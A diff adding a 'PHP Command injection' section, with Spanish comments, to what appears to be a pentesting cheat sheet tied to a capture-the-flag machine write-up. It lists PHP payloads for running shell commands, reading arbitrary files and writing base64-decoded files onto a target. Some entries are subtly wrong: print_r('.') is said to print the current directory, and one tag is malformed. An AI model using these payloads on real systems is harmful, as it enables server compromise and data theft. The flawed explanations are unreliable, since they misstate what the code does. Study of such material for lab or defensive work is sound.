@@ -104,3 +104,14 @@ cd Invoke-DOSfuscation
 Import-Module .\Invoke-DOSfuscation.psd1
 Invoke-DOSfuscation
 
+----------      ----------      ----------      ----------
+### PHP Command injection
+maquina: hackback (s4vitar writeup min ~1:39:00)
+<?php echo shell_exec("whoami"); ?>
+#En el caso de que shell_exec este habilitado, seria posible que nos devuelva el output del comando
+<?php print_r("."); ?>
+#Hace print del directorio actual
+<?php file_get_contents(<file>); ?>
+#En el caso de tener capacidad de listar contenido de los directorios, el comando de arriba nos permite leer X file
+<php file_put_contents("name to save", base64_decode("cadena_base64"));?>
+#En caso de que se interprete codigo php podemos subir un archivo encodeando en base64 en nuestra maquina y mandandolo en base64 decodeandolo en el target
